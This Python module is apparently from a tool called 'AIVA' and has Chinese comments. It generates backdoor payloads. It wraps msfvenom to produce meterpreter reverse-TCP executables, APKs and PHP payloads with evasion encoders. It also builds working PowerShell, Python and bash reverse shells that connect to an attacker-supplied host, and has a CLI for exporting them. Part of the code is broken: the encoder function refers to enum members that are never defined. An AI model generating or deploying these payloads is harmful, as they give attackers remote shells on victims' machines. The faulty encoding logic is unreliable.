"""
AIVA Payload Generation Module
==============================

基於 HackingTool 的 payload_creator.py 設計的載荷生成工具集成模組。
提供多平台載荷生成、後門創建、Shellcode生成等功能。

Author: AIVA Development Team  
License: MIT
"""

import os
import sys
import json
import base64
import hashlib
import tempfile
import subprocess
import asyncio
from pathlib import Path
from typing import Dict, List, Optional, Any, Union, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.prompt import Prompt
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.layout import Layout
from rich.live import Live

import logging
LOGGER = logging.getLogger(__name__)

console = Console()
PAYLOAD_STYLE = "bold magenta"
SUCCESS_STYLE = "bold green" 
ERROR_STYLE = "bold red"
INFO_STYLE = "bold yellow"


class PayloadType(Enum):
    """載荷類型"""
    WINDOWS_EXECUTABLE = auto()
    LINUX_EXECUTABLE = auto()
    ANDROID_APK = auto()
    MACOS_EXECUTABLE = auto()
    POWERSHELL_SCRIPT = auto()
    BASH_SCRIPT = auto()
    PYTHON_SCRIPT = auto()
    SHELLCODE = auto()
    DLL_LIBRARY = auto()
    WEB_PAYLOAD = auto()


class PayloadFormat(Enum):
    """載荷格式"""
    EXE = "exe"
    ELF = "elf"  
    APK = "apk"
    MACHO = "macho"
    PS1 = "ps1"
    SH = "sh"
    PY = "py" 
    RAW = "raw"
    HEX = "hex"
    BASE64 = "base64"
    C = "c"
    PYTHON = "python"
    POWERSHELL = "powershell"
    ASP = "asp"
    ASPX = "aspx"
    JSP = "jsp"
    PHP = "php"
    WAR = "war"


class PayloadEncoder(Enum):
    """載荷編碼器"""
    NONE = "none"
    SHIKATA_GA_NAI = "x86/shikata_ga_nai"
    ALPHA_MIXED = "x86/alpha_mixed"
    ALPHA_UPPER = "x86/alpha_upper"
    CALL4_DWORD_XOR = "x86/call4_dword_xor"
    COUNTDOWN = "x86/countdown"
    FNX_STEG = "x86/fnx_steg"
    JMP_CALL_ADDITIVE = "x86/jmp_call_additive"
    NONALPHA = "x86/nonalpha"
    NONUPPER = "x86/nonupper"
    UNICODE_MIXED = "x86/unicode_mixed"
    UNICODE_UPPER = "x86/unicode_upper"


class PayloadArchitecture(Enum):
    """載荷架構"""
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"
    MIPS64 = "mips64"


@dataclass
class PayloadConfig:
    """載荷配置"""
    name: str
    payload_type: PayloadType
    format: PayloadFormat
    lhost: str = "127.0.0.1"
    lport: int = 4444
    architecture: PayloadArchitecture = PayloadArchitecture.X86
    encoder: PayloadEncoder = PayloadEncoder.NONE
    iterations: int = 1
    template: Optional[str] = None
    platform: Optional[str] = None
    badchars: Optional[str] = None
    exitfunc: str = "process"
    payload_options: Dict[str, Any] = field(default_factory=dict)
    advanced_options: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        """轉換為字典"""
        return {
            "name": self.name,
            "payload_type": self.payload_type.name,
            "format": self.format.value,
            "lhost": self.lhost,
            "lport": self.lport,
            "architecture": self.architecture.value,
            "encoder": self.encoder.value,
            "iterations": self.iterations,
            "template": self.template,
            "platform": self.platform,
            "badchars": self.badchars,
            "exitfunc": self.exitfunc,
            "payload_options": self.payload_options,
            "advanced_options": self.advanced_options
        }


@dataclass  
class PayloadResult:
    """載荷生成結果"""
    config: PayloadConfig
    success: bool
    payload_data: Optional[bytes] = None
    payload_path: Optional[str] = None
    file_size: Optional[int] = None
    file_hash: Optional[str] = None
    creation_time: datetime = field(default_factory=datetime.now)
    execution_time: Optional[float] = None
    error_message: Optional[str] = None
    warnings: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def get_hash(self) -> Optional[str]:
        """獲取載荷哈希"""
        if self.payload_data:
            return hashlib.sha256(self.payload_data).hexdigest()
        elif self.payload_path and Path(self.payload_path).exists():
            with open(self.payload_path, 'rb') as f:
                return hashlib.sha256(f.read()).hexdigest()
        return None
    
    def save_to_file(self, output_path: str) -> bool:
        """保存載荷到文件"""
        try:
            if self.payload_data:
                with open(output_path, 'wb') as f:
                    f.write(self.payload_data)
                return True
            elif self.payload_path and Path(self.payload_path).exists():
                import shutil
                shutil.copy2(self.payload_path, output_path)
                return True
            return False
        except Exception as e:
            LOGGER.error(f"保存載荷失敗: {e}")
            return False


class MSFVenomGenerator:
    """MSFVenom載荷生成器 - 基於HackingTool的MSFVenom"""
    
    def __init__(self):
        self.console = Console()
        self.msfvenom_path = self._find_msfvenom()
        LOGGER.info("MSFVenom生成器已初始化")
    
    def _find_msfvenom(self) -> Optional[str]:
        """查找msfvenom可執行文件"""
        possible_paths = [
            "/usr/bin/msfvenom",
            "/opt/metasploit-framework/bin/msfvenom", 
            "/usr/local/bin/msfvenom",
            "msfvenom"  # 在PATH中查找
        ]
        
        for path in possible_paths:
            try:
                result = subprocess.run([path, "--help"], 
                                      capture_output=True, 
                                      text=True, 
                                      timeout=10)
                if result.returncode == 0:
                    return path
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
        
        return None
    
    def is_available(self) -> bool:
        """檢查MSFVenom是否可用"""
        return self.msfvenom_path is not None
    
    async def generate_payload(self, config: PayloadConfig) -> PayloadResult:
        """生成載荷"""
        start_time = datetime.now()
        
        if not self.is_available():
            return PayloadResult(
                config=config,
                success=False,
                error_message="MSFVenom未安裝或不可用"
            )
        
        try:
            # 構建msfvenom命令
            cmd = self._build_msfvenom_command(config)
            
            LOGGER.info(f"執行MSFVenom命令: {' '.join(cmd)}")
            
            # 執行命令
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            if process.returncode == 0:
                return self._process_success_result(config, stdout, execution_time)
            else:
                return PayloadResult(
                    config=config,
                    success=False,
                    error_message=stderr.decode() if stderr else "生成失敗",
                    execution_time=execution_time
                )
                
        except Exception as e:
            execution_time = (datetime.now() - start_time).total_seconds()
            return PayloadResult(
                config=config,
                success=False,
                error_message=str(e),
                execution_time=execution_time
            )
    
    def _build_msfvenom_command(self, config: PayloadConfig) -> List[str]:
        """構建msfvenom命令"""
        cmd = [self.msfvenom_path]
        
        # 基礎載荷設置
        payload_name = self._get_payload_name(config)
        cmd.extend(["-p", payload_name])
        
        # 連接設置
        cmd.extend([f"LHOST={config.lhost}", f"LPORT={config.lport}"])
        
        # 載荷選項
        for key, value in config.payload_options.items():
            cmd.append(f"{key}={value}")
        
        # 格式設置
        cmd.extend(["-f", config.format.value])
        
        # 架構設置
        if config.architecture != PayloadArchitecture.X86:
            cmd.extend(["-a", config.architecture.value])
        
        # 編碼器設置
        if config.encoder != PayloadEncoder.NONE:
            cmd.extend(["-e", config.encoder.value])
            if config.iterations > 1:
                cmd.extend(["-i", str(config.iterations)])
        
        # 壞字符設置
        if config.badchars:
            cmd.extend(["-b", config.badchars])
        
        # 模板設置
        if config.template:
            cmd.extend(["-x", config.template])
        
        # 平台設置
        if config.platform:
            cmd.extend(["--platform", config.platform])
        
        # 退出函數
        cmd.append(f"EXITFUNC={config.exitfunc}")
        
        return cmd
    
    def _get_payload_name(self, config: PayloadConfig) -> str:
        """獲取MSFVenom載荷名稱"""
        payload_mapping = {
            PayloadType.WINDOWS_EXECUTABLE: "windows/meterpreter/reverse_tcp",
            PayloadType.LINUX_EXECUTABLE: "linux/x86/meterpreter/reverse_tcp",
            PayloadType.ANDROID_APK: "android/meterpreter/reverse_tcp",
            PayloadType.MACOS_EXECUTABLE: "osx/x86/shell_reverse_tcp",
            PayloadType.POWERSHELL_SCRIPT: "windows/powershell_reverse_tcp",
            PayloadType.BASH_SCRIPT: "cmd/unix/reverse_bash",
            PayloadType.PYTHON_SCRIPT: "python/meterpreter/reverse_tcp",
            PayloadType.SHELLCODE: "windows/shell/reverse_tcp",
            PayloadType.DLL_LIBRARY: "windows/meterpreter/reverse_tcp",
            PayloadType.WEB_PAYLOAD: "php/meterpreter/reverse_tcp"
        }
        
        return payload_mapping.get(config.payload_type, "windows/meterpreter/reverse_tcp")
    
    def _process_success_result(self, config: PayloadConfig, stdout: bytes, execution_time: float) -> PayloadResult:
        """處理成功結果"""
        payload_data = stdout
        file_size = len(payload_data)
        file_hash = hashlib.sha256(payload_data).hexdigest()
        
        # 如果需要保存到文件
        payload_path = None
        if config.format in [PayloadFormat.EXE, PayloadFormat.ELF, PayloadFormat.APK]:
            temp_dir = Path(tempfile.gettempdir()) / "aiva_payloads"
            temp_dir.mkdir(exist_ok=True)
            
            extension = config.format.value
            payload_path = str(temp_dir / f"{config.name}_{file_hash[:8]}.{extension}")
            
            with open(payload_path, 'wb') as f:
                f.write(payload_data)
        
        return PayloadResult(
            config=config,
            success=True,
            payload_data=payload_data,
            payload_path=payload_path,
            file_size=file_size,
            file_hash=file_hash,
            execution_time=execution_time,
            metadata={
                "generator": "msfvenom",
                "payload_name": self._get_payload_name(config)
            }
        )


class CustomPayloadGenerator:
    """自定義載荷生成器 - 基於HackingTool的TheFatRat/Venom功能"""
    
    def __init__(self):
        self.console = Console()
        self.templates_dir = Path(__file__).parent / "payload_templates"
        self.templates_dir.mkdir(exist_ok=True)
        LOGGER.info("自定義載荷生成器已初始化")
    
    async def generate_powershell_payload(self, config: PayloadConfig) -> PayloadResult:
        """生成PowerShell載荷"""
        try:
            powershell_code = self._create_powershell_reverse_shell(config.lhost, config.lport)
            
            payload_data = powershell_code.encode('utf-8')
            
            # 編碼處理
            if config.encoder != PayloadEncoder.NONE:
                payload_data = self._encode_payload(payload_data, config.encoder)
            
            return PayloadResult(
                config=config,
                success=True,
                payload_data=payload_data,
                file_size=len(payload_data),
                file_hash=hashlib.sha256(payload_data).hexdigest(),
                metadata={"generator": "custom", "type": "powershell"}
            )
            
        except Exception as e:
            return PayloadResult(
                config=config,
                success=False,
                error_message=str(e)
            )
    
    async def generate_python_payload(self, config: PayloadConfig) -> PayloadResult:
        """生成Python載荷"""
        try:
            python_code = self._create_python_reverse_shell(config.lhost, config.lport)
            
            payload_data = python_code.encode('utf-8')
            
            return PayloadResult(
                config=config,
                success=True,
                payload_data=payload_data,
                file_size=len(payload_data),
                file_hash=hashlib.sha256(payload_data).hexdigest(),
                metadata={"generator": "custom", "type": "python"}
            )
            
        except Exception as e:
            return PayloadResult(
                config=config,
                success=False,
                error_message=str(e)
            )
    
    async def generate_bash_payload(self, config: PayloadConfig) -> PayloadResult:
        """生成Bash載荷"""
        try:
            bash_code = self._create_bash_reverse_shell(config.lhost, config.lport)
            
            payload_data = bash_code.encode('utf-8')
            
            return PayloadResult(
                config=config,
                success=True,
                payload_data=payload_data,
                file_size=len(payload_data),
                file_hash=hashlib.sha256(payload_data).hexdigest(),
                metadata={"generator": "custom", "type": "bash"}
            )
            
        except Exception as e:
            return PayloadResult(
                config=config,
                success=False,
                error_message=str(e)
            )
    
    def _create_powershell_reverse_shell(self, lhost: str, lport: int) -> str:
        """創建PowerShell反向Shell"""
        return f'''
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
'''
    
    def _create_python_reverse_shell(self, lhost: str, lport: int) -> str:
        """創建Python反向Shell"""
        return f'''
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
'''
    
    def _create_bash_reverse_shell(self, lhost: str, lport: int) -> str:
        """創建Bash反向Shell"""
        return f'''#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
    
    def _encode_payload(self, payload_data: bytes, encoder: PayloadEncoder) -> bytes:
        """編碼載荷（簡化版）"""
        if encoder == PayloadEncoder.BASE64:
            return base64.b64encode(payload_data)
        elif encoder == PayloadEncoder.HEX:
            return payload_data.hex().encode()
        else:
            # 其他編碼器需要更複雜的實現
            return payload_data


class AndroidPayloadGenerator:
    """Android載荷生成器 - 基於HackingTool的MobDroid功能"""
    
    def __init__(self):
        self.console = Console()
        self.apktool_available = self._check_apktool()
        LOGGER.info("Android載荷生成器已初始化")
    
    def _check_apktool(self) -> bool:
        """檢查APKTool是否可用"""
        try:
            result = subprocess.run(["apktool", "--version"], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    async def generate_android_payload(self, config: PayloadConfig) -> PayloadResult:
        """生成Android載荷"""
        try:
            if not self.apktool_available:
                # 使用MSFVenom作為後備方案
                msfvenom = MSFVenomGenerator()
                if msfvenom.is_available():
                    config.format = PayloadFormat.APK
                    return await msfvenom.generate_payload(config)
                else:
                    return PayloadResult(
                        config=config,
                        success=False,
                        error_message="APKTool和MSFVenom都不可用"
                    )
            
            # 使用APKTool生成APK（簡化實現）
            temp_dir = Path(tempfile.gettempdir()) / "aiva_android"
            temp_dir.mkdir(exist_ok=True)
            
            # 這裡需要實現APK生成邏輯
            # 暫時返回一個占位符結果
            return PayloadResult(
                config=config,
                success=False,
                error_message="Android載荷生成功能正在開發中"
            )
            
        except Exception as e:
            return PayloadResult(
                config=config,
                success=False,
                error_message=str(e)
            )


class PayloadManager:
    """載荷管理器 - 整合所有載荷生成功能"""
    
    def __init__(self):
        self.console = Console()
        self.msfvenom_generator = MSFVenomGenerator()
        self.custom_generator = CustomPayloadGenerator()
        self.android_generator = AndroidPayloadGenerator()
        self.results_history: List[PayloadResult] = []
        
        LOGGER.info("載荷管理器已初始化")
    
    async def generate_payload(self, config: PayloadConfig) -> PayloadResult:
        """生成載荷"""
        LOGGER.info(f"開始生成載荷: {config.name}")
        
        # 根據載荷類型選擇生成器
        if config.payload_type == PayloadType.ANDROID_APK:
            result = await self.android_generator.generate_android_payload(config)
        elif config.payload_type == PayloadType.POWERSHELL_SCRIPT:
            result = await self.custom_generator.generate_powershell_payload(config)
        elif config.payload_type == PayloadType.PYTHON_SCRIPT:
            result = await self.custom_generator.generate_python_payload(config)
        elif config.payload_type == PayloadType.BASH_SCRIPT:
            result = await self.custom_generator.generate_bash_payload(config)
        else:
            # 使用MSFVenom作為默認生成器
            result = await self.msfvenom_generator.generate_payload(config)
        
        # 記錄結果
        self.results_history.append(result)
        
        if result.success:
            LOGGER.info(f"載荷生成成功: {config.name}")
        else:
            LOGGER.error(f"載荷生成失敗: {config.name} - {result.error_message}")
        
        return result
    
    def get_supported_payload_types(self) -> List[PayloadType]:
        """獲取支持的載荷類型"""
        supported = [
            PayloadType.POWERSHELL_SCRIPT,
            PayloadType.PYTHON_SCRIPT,
            PayloadType.BASH_SCRIPT
        ]
        
        if self.msfvenom_generator.is_available():
            supported.extend([
                PayloadType.WINDOWS_EXECUTABLE,
                PayloadType.LINUX_EXECUTABLE,
                PayloadType.SHELLCODE,
                PayloadType.DLL_LIBRARY,
                PayloadType.WEB_PAYLOAD
            ])
        
        if self.android_generator.apktool_available:
            supported.append(PayloadType.ANDROID_APK)
        
        return supported
    
    def create_payload_config(self, name: str, payload_type: PayloadType, 
                            lhost: str = "127.0.0.1", lport: int = 4444,
                            **kwargs) -> PayloadConfig:
        """創建載荷配置"""
        
        # 根據載荷類型自動選擇格式
        format_mapping = {
            PayloadType.WINDOWS_EXECUTABLE: PayloadFormat.EXE,
            PayloadType.LINUX_EXECUTABLE: PayloadFormat.ELF,
            PayloadType.ANDROID_APK: PayloadFormat.APK,
            PayloadType.POWERSHELL_SCRIPT: PayloadFormat.PS1,
            PayloadType.BASH_SCRIPT: PayloadFormat.SH,
            PayloadType.PYTHON_SCRIPT: PayloadFormat.PY,
            PayloadType.SHELLCODE: PayloadFormat.RAW,
            PayloadType.DLL_LIBRARY: PayloadFormat.EXE,
            PayloadType.WEB_PAYLOAD: PayloadFormat.PHP
        }
        
        format_type = format_mapping.get(payload_type, PayloadFormat.RAW)
        
        return PayloadConfig(
            name=name,
            payload_type=payload_type,
            format=format_type,
            lhost=lhost,
            lport=lport,
            **kwargs
        )
    
    def get_generation_stats(self) -> Dict[str, Any]:
        """獲取生成統計"""
        total = len(self.results_history)
        successful = len([r for r in self.results_history if r.success])
        failed = len([r for r in self.results_history if not r.success])
        
        return {
            "total_generated": total,
            "successful": successful,
            "failed": failed,
            "success_rate": (successful / total * 100) if total > 0 else 0,
            "payload_types": list(set([r.config.payload_type.name for r in self.results_history]))
        }
    
    def export_payload(self, result: PayloadResult, output_dir: str) -> bool:
        """導出載荷"""
        try:
            output_path = Path(output_dir)
            output_path.mkdir(parents=True, exist_ok=True)
            
            # 確定文件名和擴展名
            extension = result.config.format.value
            filename = f"{result.config.name}.{extension}"
            full_path = output_path / filename
            
            # 保存載荷
            success = result.save_to_file(str(full_path))
            
            if success:
                # 創建元數據文件
                metadata_path = output_path / f"{result.config.name}_metadata.json"
                metadata = {
                    "config": result.config.to_dict(),
                    "creation_time": result.creation_time.isoformat(),
                    "file_size": result.file_size,
                    "file_hash": result.file_hash,
                    "execution_time": result.execution_time,
                    "metadata": result.metadata
                }
                
                with open(metadata_path, 'w', encoding='utf-8') as f:
                    json.dump(metadata, f, indent=2, ensure_ascii=False)
                
                LOGGER.info(f"載荷已導出到: {full_path}")
                return True
            
            return False
            
        except Exception as e:
            LOGGER.error(f"導出載荷失敗: {e}")
            return False


class PayloadCLI:
    """載荷生成命令行界面 - 基於HackingTool的Rich UI設計"""
    
    def __init__(self):
        self.console = Console()
        self.manager = PayloadManager()
    
    def show_main_menu(self):
        """顯示主菜單"""
        self.console.clear()
        
        title = Panel.fit(
            "[bold magenta]AIVA 載荷生成模組[/bold magenta]\n"
            "基於 HackingTool 設計的多平台載荷生成工具",
            border_style=PAYLOAD_STYLE
        )
        self.console.print(title)
        self.console.print()
        
        table = Table(title="[bold magenta]載荷生成選單[/bold magenta]", show_lines=True, expand=True)
        table.add_column("選項", justify="center", style="bold yellow")
        table.add_column("功能", justify="left", style="bold green")
        table.add_column("說明", justify="left", style="white")
        
        table.add_row("1", "Windows載荷", "生成Windows可執行文件載荷")
        table.add_row("2", "Linux載荷", "生成Linux ELF載荷")
        table.add_row("3", "Android載荷", "生成Android APK載荷")
        table.add_row("4", "PowerShell載荷", "生成PowerShell腳本載荷")
        table.add_row("5", "Python載荷", "生成Python腳本載荷")
        table.add_row("6", "Bash載荷", "生成Bash腳本載荷")
        table.add_row("7", "自定義載荷", "自定義配置生成載荷")
        table.add_row("8", "載荷歷史", "查看生成歷史")
        table.add_row("9", "系統狀態", "檢查生成器狀態")
        table.add_row("[red]0[/red]", "[bold red]退出[/bold red]", "退出載荷生成模組")
        
        self.console.print(table)
        self.console.print()
        
        choice = Prompt.ask("[bold magenta]請選擇功能[/bold magenta]", default="0")
        return choice
    
    async def run_interactive(self):
        """運行交互式界面"""
        while True:
            try:
                choice = self.show_main_menu()
                
                if choice == "1":
                    await self.generate_windows_payload()
                elif choice == "2":
                    await self.generate_linux_payload()
                elif choice == "3":
                    await self.generate_android_payload()
                elif choice == "4":
                    await self.generate_powershell_payload()
                elif choice == "5":
                    await self.generate_python_payload()
                elif choice == "6":
                    await self.generate_bash_payload()
                elif choice == "7":
                    await self.generate_custom_payload()
                elif choice == "8":
                    self.show_payload_history()
                elif choice == "9":
                    self.show_system_status()
                elif choice == "0":
                    self.console.print("[bold green]感謝使用 AIVA 載荷生成模組！[/bold green]")
                    break
                else:
                    self.console.print("[bold red]無效選項，請重新選擇[/bold red]")
                    
                if choice != "0":
                    await asyncio.to_thread(input, "\n按 Enter 繼續...")
                    
            except KeyboardInterrupt:
                self.console.print("\n[bold yellow]用戶中斷操作[/bold yellow]")
                break
            except Exception as e:
                self.console.print(f"[bold red]發生錯誤: {e}[/bold red]")
                await asyncio.to_thread(input, "\n按 Enter 繼續...")
    
    async def generate_windows_payload(self):
        """生成Windows載荷"""
        self.console.print(Panel("Windows載荷生成", style=PAYLOAD_STYLE))
        
        name = Prompt.ask("[bold]載荷名稱[/bold]", default="windows_payload")
        lhost = Prompt.ask("[bold]監聽主機[/bold]", default="127.0.0.1")
        lport = int(Prompt.ask("[bold]監聽端口[/bold]", default="4444"))
        
        config = self.manager.create_payload_config(
            name=name,
            payload_type=PayloadType.WINDOWS_EXECUTABLE,
            lhost=lhost,
            lport=lport
        )
        
        await self._generate_and_display(config)
    
    async def generate_powershell_payload(self):
        """生成PowerShell載荷"""
        self.console.print(Panel("PowerShell載荷生成", style=PAYLOAD_STYLE))
        
        name = Prompt.ask("[bold]載荷名稱[/bold]", default="powershell_payload")
        lhost = Prompt.ask("[bold]監聽主機[/bold]", default="127.0.0.1")
        lport = int(Prompt.ask("[bold]監聽端口[/bold]", default="4444"))
        
        config = self.manager.create_payload_config(
            name=name,
            payload_type=PayloadType.POWERSHELL_SCRIPT,
            lhost=lhost,
            lport=lport
        )
        
        await self._generate_and_display(config)
    
    async def generate_linux_payload(self):
        """生成Linux載荷"""
        self.console.print(Panel("Linux載荷生成", style=PAYLOAD_STYLE))
        
        name = Prompt.ask("[bold]載荷名稱[/bold]", default="linux_payload")
        lhost = Prompt.ask("[bold]監聽主機[/bold]", default="127.0.0.1")
        lport = int(Prompt.ask("[bold]監聽端口[/bold]", default="4444"))
        
        config = self.manager.create_payload_config(
            name=name,
            payload_type=PayloadType.LINUX_EXECUTABLE,
            lhost=lhost,
            lport=lport
        )
        
        await self._generate_and_display(config)
    
    async def generate_android_payload(self):
        """生成Android載荷"""
        self.console.print(Panel("Android載荷生成", style=PAYLOAD_STYLE))
        
        name = Prompt.ask("[bold]載荷名稱[/bold]", default="android_payload")
        lhost = Prompt.ask("[bold]監聽主機[/bold]", default="127.0.0.1")
        lport = int(Prompt.ask("[bold]監聽端口[/bold]", default="4444"))
        
        config = self.manager.create_payload_config(
            name=name,
            payload_type=PayloadType.ANDROID_APK,
            lhost=lhost,
            lport=lport
        )
        
        await self._generate_and_display(config)
    
    async def generate_python_payload(self):
        """生成Python載荷"""
        self.console.print(Panel("Python載荷生成", style=PAYLOAD_STYLE))
        
        name = Prompt.ask("[bold]載荷名稱[/bold]", default="python_payload")
        lhost = Prompt.ask("[bold]監聽主機[/bold]", default="127.0.0.1")
        lport = int(Prompt.ask("[bold]監聽端口[/bold]", default="4444"))
        
        config = self.manager.create_payload_config(
            name=name,
            payload_type=PayloadType.PYTHON_SCRIPT,
            lhost=lhost,
            lport=lport
        )
        
        await self._generate_and_display(config)
    
    async def generate_bash_payload(self):
        """生成Bash載荷"""
        self.console.print(Panel("Bash載荷生成", style=PAYLOAD_STYLE))
        
        name = Prompt.ask("[bold]載荷名稱[/bold]", default="bash_payload")
        lhost = Prompt.ask("[bold]監聽主機[/bold]", default="127.0.0.1")
        lport = int(Prompt.ask("[bold]監聽端口[/bold]", default="4444"))
        
        config = self.manager.create_payload_config(
            name=name,
            payload_type=PayloadType.BASH_SCRIPT,
            lhost=lhost,
            lport=lport
        )
        
        await self._generate_and_display(config)
    
    async def generate_custom_payload(self):
        """生成自定義載荷"""
        self.console.print(Panel("自定義載荷配置", style=PAYLOAD_STYLE))
        
        # 顯示支持的載荷類型
        supported_types = self.manager.get_supported_payload_types()
        
        type_table = Table(title="支持的載荷類型")
        type_table.add_column("編號", style="yellow")
        type_table.add_column("類型", style="green")
        
        for i, ptype in enumerate(supported_types, 1):
            type_table.add_row(str(i), ptype.name)
        
        self.console.print(type_table)
        
        type_choice = int(Prompt.ask("[bold]選擇載荷類型[/bold]", default="1")) - 1
        if 0 <= type_choice < len(supported_types):
            payload_type = supported_types[type_choice]
        else:
            payload_type = supported_types[0]
        
        name = Prompt.ask("[bold]載荷名稱[/bold]", default="custom_payload")
        lhost = Prompt.ask("[bold]監聽主機[/bold]", default="127.0.0.1")
        lport = int(Prompt.ask("[bold]監聽端口[/bold]", default="4444"))
        
        config = self.manager.create_payload_config(
            name=name,
            payload_type=payload_type,
            lhost=lhost,
            lport=lport
        )
        
        await self._generate_and_display(config)
    
    async def _generate_and_display(self, config: PayloadConfig):
        """生成並顯示載荷"""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("正在生成載荷...", total=None)
            
            result = await self.manager.generate_payload(config)
            
            progress.update(task, description="生成完成")
        
        # 顯示結果
        if result.success:
            success_panel = Panel(
                f"[green]✅ 載荷生成成功！[/green]\n\n"
                f"名稱: {result.config.name}\n"
                f"類型: {result.config.payload_type.name}\n"
                f"格式: {result.config.format.value}\n"
                f"大小: {result.file_size} bytes\n"
                f"哈希: {result.file_hash[:16]}...\n"
                f"耗時: {result.execution_time:.2f}秒",
                title="生成結果",
                border_style=SUCCESS_STYLE
            )
            self.console.print(success_panel)
            
            # 詢問是否導出
            export = Prompt.ask("[bold]是否導出載荷到文件？[/bold]", choices=["y", "n"], default="y")
            if export.lower() == "y":
                output_dir = Prompt.ask("[bold]輸出目錄[/bold]", default="./payloads")
                if self.manager.export_payload(result, output_dir):
                    self.console.print(f"[green]✅ 載荷已導出到: {output_dir}[/green]")
                else:
                    self.console.print("[red]❌ 導出失敗[/red]")
        else:
            error_panel = Panel(
                f"[red]❌ 載荷生成失敗[/red]\n\n"
                f"錯誤信息: {result.error_message}",
                title="生成結果",
                border_style=ERROR_STYLE
            )
            self.console.print(error_panel)
    
    def show_payload_history(self):
        """顯示載荷歷史"""
        self.console.print(Panel("載荷生成歷史", style=PAYLOAD_STYLE))
        
        if not self.manager.results_history:
            self.console.print("[yellow]暫無載荷生成記錄[/yellow]")
            return
        
        history_table = Table(title="歷史記錄", show_lines=True)
        history_table.add_column("時間", style="cyan")
        history_table.add_column("名稱", style="green")
        history_table.add_column("類型", style="yellow")
        history_table.add_column("狀態", style="magenta")
        history_table.add_column("大小", style="blue")
        history_table.add_column("耗時", style="white")
        
        for result in self.manager.results_history[-20:]:  # 顯示最近20條
            status_style = SUCCESS_STYLE if result.success else ERROR_STYLE
            status = "成功" if result.success else "失敗"
            size = f"{result.file_size}B" if result.file_size else "N/A"
            time_str = f"{result.execution_time:.2f}s" if result.execution_time else "N/A"
            
            history_table.add_row(
                result.creation_time.strftime("%H:%M:%S"),
                result.config.name,
                result.config.payload_type.name,
                f"[{status_style}]{status}[/]",
                size,
                time_str
            )
        
        self.console.print(history_table)
    
    def show_system_status(self):
        """顯示系統狀態"""
        self.console.print(Panel("系統狀態檢查", style=PAYLOAD_STYLE))
        
        status_table = Table(title="生成器狀態", show_lines=True)
        status_table.add_column("組件", style="cyan")
        status_table.add_column("狀態", style="green")
        status_table.add_column("說明", style="white")
        
        # MSFVenom狀態
        msfvenom_status = "✅ 可用" if self.manager.msfvenom_generator.is_available() else "❌ 不可用"
        status_table.add_row("MSFVenom", msfvenom_status, "Metasploit載荷生成器")
        
        # APKTool狀態
        apktool_status = "✅ 可用" if self.manager.android_generator.apktool_available else "❌ 不可用"
        status_table.add_row("APKTool", apktool_status, "Android APK工具")
        
        # 自定義生成器
        status_table.add_row("自定義生成器", "✅ 可用", "PowerShell/Python/Bash腳本生成")
        
        self.console.print(status_table)
        
        # 統計信息
        stats = self.manager.get_generation_stats()
        stats_table = Table(title="生成統計", show_lines=True)
        stats_table.add_column("項目", style="cyan")
        stats_table.add_column("數值", style="green")
        
        stats_table.add_row("總生成數", str(stats["total_generated"]))
        stats_table.add_row("成功數", str(stats["successful"]))
        stats_table.add_row("失敗數", str(stats["failed"]))
        stats_table.add_row("成功率", f"{stats['success_rate']:.1f}%")
        
        self.console.print(stats_table)


# 註冊到能力系統
async def register_payload_capabilities():
    """註冊載荷生成能力到系統"""
    from .models import CapabilityRecord, ProgrammingLanguage
    from .registry import CapabilityRegistry
    from .models import CapabilityType
    
    registry = CapabilityRegistry()
    
    # 註冊MSFVenom生成器
    msfvenom_capability = CapabilityRecord(
        id="payload.msfvenom",
        name="MSFVenom載荷生成器",
        description="基於Metasploit框架的載荷生成工具",
        module="payload_generator",
        language=ProgrammingLanguage.PYTHON,
        entrypoint="MSFVenomGenerator",
        capability_type=CapabilityType.UTILITY,
        dependencies=["metasploit-framework"],
        tags=["payload", "metasploit", "exploitation"]
    )
    await registry.register_capability(msfvenom_capability)
    
    # 註冊自定義載荷生成器
    custom_capability = CapabilityRecord(
        id="payload.custom",
        name="自定義載荷生成器",
        description="生成PowerShell、Python、Bash等腳本載荷",
        module="payload_generator",
        language=ProgrammingLanguage.PYTHON,
        entrypoint="CustomPayloadGenerator",
        capability_type=CapabilityType.UTILITY,
        dependencies=[],
        tags=["payload", "scripting", "custom"]
    )
    await registry.register_capability(custom_capability)
    
    # 註冊Android載荷生成器
    android_capability = CapabilityRecord(
        id="payload.android",
        name="Android載荷生成器",
        description="生成Android APK載荷",
        module="payload_generator",
        language=ProgrammingLanguage.PYTHON,
        entrypoint="AndroidPayloadGenerator",
        capability_type=CapabilityType.UTILITY,
        dependencies=["apktool"],
        tags=["payload", "android", "mobile"]
    )
    await registry.register_capability(android_capability)
    
    # 註冊載荷管理器
    manager_capability = CapabilityRecord(
        id="payload.manager",
        name="載荷管理器",
        description="統一載荷生成和管理系統",
        module="payload_generator",
